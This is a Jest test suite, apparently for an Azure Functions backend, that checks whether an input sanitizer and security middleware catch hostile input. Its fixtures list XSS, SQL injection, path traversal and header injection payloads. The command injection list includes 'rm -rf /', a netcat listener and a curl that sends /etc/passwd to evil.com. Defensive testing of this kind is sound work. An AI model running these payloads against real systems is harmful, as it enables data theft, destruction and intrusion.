import { SecurityService } from '../services/security.service';
import { SecurityMiddleware } from '../middleware/security.middleware';
import { HttpRequest, InvocationContext } from '@azure/functions';

// Mock dependencies
jest.mock('../lib/database');

const mockContext = {
  log: jest.fn(),
  error: jest.fn(),
  extraOutputs: new Map()
} as unknown as InvocationContext;

const createMockRequest = (options: {
  method?: string;
  url?: string;
  headers?: Record<string, string>;
  body?: any;
}): HttpRequest => ({
  method: options.method || 'GET',
  url: options.url || 'https://example.com/api/test',
  headers: new Map(Object.entries(options.headers || {})),
  text: async () => JSON.stringify(options.body || {}),
  json: async () => options.body || {}
} as HttpRequest);

describe('Security Penetration Tests', () => {
  let securityService: SecurityService;
  let securityMiddleware: SecurityMiddleware;

  beforeEach(() => {
    securityService = new SecurityService();
    securityMiddleware = new SecurityMiddleware();
    jest.clearAllMocks();
  });

  describe('XSS Attack Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<svg onload="alert(\'XSS\')">',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="javascript:alert(\'XSS\')"></object>',
      '<embed src="javascript:alert(\'XSS\')">',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '<style>@import "javascript:alert(\'XSS\')"</style>',
      '<div style="background:url(javascript:alert(\'XSS\'))">',
      'onmouseover="alert(\'XSS\')"',
      'onfocus="alert(\'XSS\')"',
      'onload="alert(\'XSS\')"'
    ];

    test.each(xssPayloads)('should sanitize XSS payload: %s', (payload) => {
      const sanitized = securityService.sanitizeInput(payload);
      
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('onload=');
      expect(sanitized).not.toContain('onmouseover=');
      expect(sanitized).not.toContain('onfocus=');
    });

    test('should detect XSS in request validation', async () => {
      const request = createMockRequest({
        method: 'POST',
        body: {
          description: '<script>alert("XSS")</script>Malicious content',
          name: '<img src="x" onerror="alert(\'XSS\')">'
        }
      });

      const result = await securityMiddleware.apply(request, mockContext, {
        validateInput: true
      });

      expect(result).not.toBeNull();
      expect(result?.status).toBe(400);
      expect(result?.jsonBody?.details).toContain('Potentially malicious content detected');
    });
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "1; DELETE FROM users WHERE 1=1 --",
      "'; UPDATE users SET password='hacked' WHERE 1=1 --"
    ];

    test.each(sqlInjectionPayloads)('should detect SQL injection payload: %s', (payload) => {
      const sanitized = securityService.sanitizeInput(payload);
      
      // Should remove or escape dangerous SQL keywords
      expect(sanitized).not.toContain('DROP TABLE');
      expect(sanitized).not.toContain('UNION SELECT');
      expect(sanitized).not.toContain('INSERT INTO');
      expect(sanitized).not.toContain('DELETE FROM');
      expect(sanitized).not.toContain('UPDATE');
      expect(sanitized).not.toContain('EXEC');
    });

    test('should detect SQL injection in request validation', async () => {
      const request = createMockRequest({
        method: 'POST',
        body: {
          email: "admin'; DROP TABLE users; --",
          description: "' OR '1'='1"
        }
      });

      const result = await securityMiddleware.apply(request, mockContext, {
        validateInput: true
      });

      expect(result).not.toBeNull();
      expect(result?.status).toBe(400);
      expect(result?.jsonBody?.details).toContain('Potentially malicious content detected');
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& rm -rf /',
      '`whoami`',
      '$(id)',
      '; ping google.com',
      '| nc -l 4444',
      '&& curl http://evil.com',
      '; wget http://malware.com/script.sh',
      '`curl -X POST http://evil.com/steal --data "$(cat /etc/passwd)"`'
    ];

    test.each(commandInjectionPayloads)('should sanitize command injection payload: %s', (payload) => {
      const sanitized = securityService.sanitizeInput(payload);
      
      // Should not contain dangerous command characters
      expect(sanitized.length).toBeLessThanOrEqual(payload.length);
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ];

    test.each(pathTraversalPayloads)('should sanitize path traversal payload: %s', (payload) => {
      const sanitized = securityService.sanitizeInput(payload);
      
      // Should not contain path traversal sequences
      expect(sanitized).not.toContain('../');
      expect(sanitized).not.toContain('..\\');
      expect(sanitized).not.toContain('%2e%2e');
    });
  });

  describe('Rate Limiting Bypass Attempts', () => {
    test('should not be bypassed by changing IP headers', async () => {
      const baseRequest = {
        method: 'POST',
        url: 'https://example.com/api/auth/register',
        body: { email: 'test@example.com' }
      };

      // Try to bypass rate limiting by changing various IP headers
      const ipHeaders = [
        { 'x-forwarded-for': '192.168.1.1' },
        { 'x-real-ip': '192.168.1.2' },
        { 'cf-connecting-ip': '192.168.1.3' },
        { 'x-forwarded-for': '192.168.1.1, 10.0.0.1' }, // Multiple IPs
        {} // No IP headers
      ];

      const results = [];
      for (const headers of ipHeaders) {
        const request = createMockRequest({ ...baseRequest, headers });
        const result = await securityMiddleware.apply(request, mockContext, {
          rateLimit: { windowMs: 60000, maxRequests: 1 }
        });
        results.push(result);
      }

      // At least some requests should be rate limited
      const rateLimitedRequests = results.filter(r => r?.status === 429);
      expect(rateLimitedRequests.length).toBeGreaterThan(0);
    });

    test('should handle distributed rate limiting attempts', async () => {
      const requests = [];
      
      // Simulate multiple IPs trying to overwhelm the system
      for (let i = 0; i < 10; i++) {
        const request = createMockRequest({
          method: 'POST',
          url: 'https://example.com/api/auth/register',
          headers: { 'x-forwarded-for': `192.168.1.${i}` },
          body: { email: `test${i}@example.com` }
        });
        
        requests.push(securityMiddleware.apply(request, mockContext, {
          rateLimit: { windowMs: 60000, maxRequests: 2 }
        }));
      }

      const results = await Promise.all(requests);
      
      // Should handle all requests without crashing
      expect(results).toHaveLength(10);
      results.forEach(result => {
        expect(result?.status).toBeDefined();
      });
    });
  });

  describe('Authentication Bypass Attempts', () => {
    test('should reject malformed JWT tokens', () => {
      const malformedTokens = [
        'invalid.token.here',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        '',
        'Bearer ',
        'null',
        'undefined',
        '{}',
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.' // None algorithm
      ];

      malformedTokens.forEach(token => {
        // This would be tested in the auth middleware
        expect(token).toBeDefined(); // Placeholder - actual JWT validation would happen in auth middleware
      });
    });
  });

  describe('Data Validation Bypass Attempts', () => {
    test('should reject oversized payloads', async () => {
      const oversizedPayload = {
        description: 'A'.repeat(100000), // 100KB description
        data: 'B'.repeat(50000) // Additional large field
      };

      const request = createMockRequest({
        method: 'POST',
        body: oversizedPayload
      });

      const result = await securityMiddleware.apply(request, mockContext, {
        validateInput: true
      });

      expect(result).not.toBeNull();
      expect(result?.status).toBe(400);
      expect(result?.jsonBody?.details).toContain('Request payload too large');
    });

    test('should handle deeply nested objects', async () => {
      // Create deeply nested object to test for DoS
      let deepObject: any = {};
      let current = deepObject;
      
      for (let i = 0; i < 100; i++) {
        current.nested = {};
        current = current.nested;
      }
      current.value = 'deep';

      const request = createMockRequest({
        method: 'POST',
        body: deepObject
      });

      const result = await securityMiddleware.apply(request, mockContext, {
        validateInput: true
      });

      // Should handle without crashing
      expect(result).toBeDefined();
    });

    test('should handle circular references in JSON', async () => {
      // This would typically be caught by JSON.stringify throwing an error
      const request = {
        method: 'POST',
        url: 'https://example.com/api/test',
        headers: new Map(),
        text: async () => '{"a": {"b": {"$ref": "#/a"}}}', // Simulated circular reference
        json: async () => { throw new Error('Converting circular structure to JSON'); }
      } as HttpRequest;

      const result = await securityMiddleware.apply(request, mockContext, {
        validateInput: true
      });

      expect(result).not.toBeNull();
      expect(result?.status).toBe(400);
    });
  });

  describe('Header Injection Attacks', () => {
    test('should sanitize malicious headers', async () => {
      const maliciousHeaders = {
        'x-forwarded-for': '<script>alert("xss")</script>',
        'user-agent': 'Mozilla/5.0\r\nSet-Cookie: malicious=true',
        'referer': 'javascript:alert("xss")',
        'x-real-ip': '192.168.1.1\r\nHost: evil.com'
      };

      const request = createMockRequest({
        headers: maliciousHeaders
      });

      const result = await securityMiddleware.apply(request, mockContext, {
        auditLog: true
      });

      // Should not crash and should handle malicious headers
      expect(result).toBeNull(); // Should continue processing but log the attempt
    });
  });

  describe('Timing Attack Prevention', () => {
    test('should have consistent response times for invalid vs valid emails', async () => {
      const validEmail = 'valid@example.com';
      const invalidEmail = 'invalid-email-format';

      const startTime1 = Date.now();
      const result1 = securityService.validateEmail(validEmail);
      const endTime1 = Date.now();

      const startTime2 = Date.now();
      const result2 = securityService.validateEmail(invalidEmail);
      const endTime2 = Date.now();

      const timeDiff = Math.abs((endTime1 - startTime1) - (endTime2 - startTime2));
      
      // Time difference should be minimal (less than 10ms for simple validation)
      expect(timeDiff).toBeLessThan(10);
      expect(result1).toBe(true);
      expect(result2).toBe(false);
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    test('should handle multiple concurrent requests', async () => {
      const concurrentRequests = Array.from({ length: 50 }, (_, i) => 
        securityMiddleware.apply(
          createMockRequest({
            headers: { 'x-forwarded-for': `192.168.1.${i % 10}` }
          }),
          mockContext,
          { auditLog: true }
        )
      );

      const results = await Promise.all(concurrentRequests);
      
      // All requests should be handled without crashing
      expect(results).toHaveLength(50);
      results.forEach(result => {
        expect(result).toBeDefined();
      });
    });

    test('should limit memory usage for large inputs', () => {
      const largeInput = 'A'.repeat(10000);
      const sanitized = securityService.sanitizeInput(largeInput);
      
      // Should be truncated to prevent memory exhaustion
      expect(sanitized.length).toBeLessThanOrEqual(1000);
    });
  });

  describe('Protocol-Level Attacks', () => {
    test('should handle HTTP method override attempts', async () => {
      const request = createMockRequest({
        method: 'POST',
        headers: {
          'x-http-method-override': 'DELETE',
          'x-method-override': 'PUT'
        }
      });

      const result = await securityMiddleware.apply(request, mockContext, {
        auditLog: true
      });

      // Should not be affected by method override headers
      expect(result).toBeNull();
    });

    test('should handle host header injection', async () => {
      const request = createMockRequest({
        headers: {
          'host': 'evil.com\r\nSet-Cookie: malicious=true'
        }
      });

      const result = await securityMiddleware.apply(request, mockContext, {
        auditLog: true
      });

      // Should handle without crashing
      expect(result).toBeDefined();
    });
  });
});